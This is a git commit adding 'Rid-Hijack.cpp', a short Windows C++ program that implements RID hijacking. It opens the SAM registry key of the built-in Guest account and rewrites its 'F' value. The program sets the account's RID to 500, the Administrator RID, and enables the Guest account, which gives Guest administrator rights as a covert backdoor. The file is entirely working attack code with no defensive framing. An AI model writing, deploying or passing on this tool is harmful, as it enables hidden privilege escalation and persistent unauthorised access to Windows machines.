36ca8d449aa4b72ba2d0221a325d5b7bbe228420
真 罗 <1959132915@qq.com>
2020-05-07 15:49:21 +0800

    添加项目文件。

---
+++ Rid-Hijack/Rid-Hijack.cpp
@@ -0,0 +1,24 @@
+﻿
+#include <Windows.h>
+#include <stdio.h>
+
+
+int  main()
+{
+	HKEY hKey = NULL;
+	PCHAR KeyAddr = NULL;
+	DWORD KeySize;
+	DWORD KeyType;
+	BYTE Buffer[0x50] = { 0 };
+	KeyAddr = (PCHAR)"SAM\\SAM\\Domains\\Account\\Users\\000001F5";
+
+	RegOpenKeyExA(HKEY_LOCAL_MACHINE, KeyAddr, 0, KEY_ALL_ACCESS, &hKey);
+	RegQueryValueExA(hKey, "F", NULL, &KeyType, (LPBYTE)&Buffer, &KeySize);
+
+	Buffer[0x30] = (BYTE)0xf4; //hijack rid
+	Buffer[0x38] = (BYTE)0x14; //enable guest
+	
+	RegSetValueExA(hKey, "F",NULL, KeyType, Buffer, KeySize);
+	RegCloseKey(hKey);
+	return 0;
+}
